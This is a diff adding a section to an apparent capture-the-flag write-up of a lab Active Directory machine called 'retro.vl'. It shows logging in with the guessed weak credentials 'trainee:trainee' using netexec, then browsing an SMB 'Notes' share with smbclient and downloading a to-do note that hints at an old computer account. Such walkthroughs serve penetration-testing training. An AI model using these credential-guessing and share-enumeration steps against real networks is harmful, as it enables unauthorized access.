@@ -224,6 +224,8 @@ Apparently, this is an admin message addressed to all trainees in the company. I
 
 After seeing this, one thing we should try is logging in using the weak credentials `trainee:trainee`:
 
+<br />
+
 ```bash
 ❯ netexec smb retro.vl -u "trainee" -p "trainee" --shares
 SMB         10.129.28.100   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -242,5 +244,47 @@ SMB         10.129.28.100   445    DC               Trainees        READ
 
 <br />
 
+This account has access to another interesting share: `Notes`
 
+Inside this share, there are dous .txt files:
+
+- The user flag: user.txt.
+
+- A tasklis: ToDo.txt
+
+<br />
+
+```bash
+❯ smbclient //retro.vl/Notes -U "trainee"
+Password for [WORKGROUP\trainee]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Apr  9 05:12:49 2025
+  ..                                DHS        0  Wed Jun 11 16:17:10 2025
+  ToDo.txt                            A      248  Mon Jul 24 00:05:56 2023
+  user.txt                            A       32  Wed Apr  9 05:13:01 2025
+
+		4659711 blocks of size 4096. 1326667 blocks available
+smb: \> get ToDo.txt 
+getting file \ToDo.txt of size 248 as ToDo.txt (1,2 KiloBytes/sec) (average 1,2 KiloBytes/sec)
+smb: \>
+```
+
+<br />
+
+The `ToDo.txt` file contains another message:
+
+<br />
+
+```bash
+Thomas,
+
+after convincing the finance department to get rid of their ancienct banking software
+it is finally time to clean up the mess they made. We should start with the pre created
+computer account. That one is older than me.
+
+Best
+
+James
+```
 
